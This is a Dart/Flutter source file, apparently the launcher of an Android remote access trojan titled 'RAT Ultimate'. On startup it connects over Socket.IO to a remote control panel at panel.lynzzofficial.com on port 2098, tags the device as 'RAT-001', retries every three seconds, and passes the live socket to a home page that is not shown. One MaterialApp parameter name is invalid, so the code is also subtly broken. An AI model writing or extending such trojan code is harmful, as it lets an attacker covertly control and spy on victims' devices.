import 'package:flutter/material.dart';
import 'package:socket_io_client/socket_io_client.dart';
import 'home_page.dart';

void main() => runApp(MyApp());

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'RAT Ultimate',
      theme: ThemeData.dark(),
      home: LoaderPage(),
      debugShowCheckedBanner: false,
    );
  }
}

class LoaderPage extends StatefulWidget {
  @override
  _LoaderPageState createState() => _LoaderPageState();
}

class _LoaderPageState extends State<LoaderPage> {
  String status = "Connecting to panel...";

  @override
  void initState() {
    super.initState();
    connectSocket();
  }

  void connectSocket() {
    Socket socket = io('http://panel.lynzzofficial.com:2098', <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': true,
      'extraHeaders': {'device-id': 'RAT-001'}
    });

    socket.onConnect((_) {
      setState(() => status = "✅ Connected");
      Navigator.pushReplacement(context, MaterialPageRoute(builder: (_) => HomePage(socket: socket)));
    });

    socket.onConnectError((_) {
      setState(() => status = "❌ Retrying...");
      Future.delayed(Duration(seconds: 3), connectSocket);
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            CircularProgressIndicator(color: Colors.green),
            SizedBox(height: 20),
            Text(status, style: TextStyle(color: Colors.white, fontSize: 18)),
          ],
        ),
      ),
    );
  }
}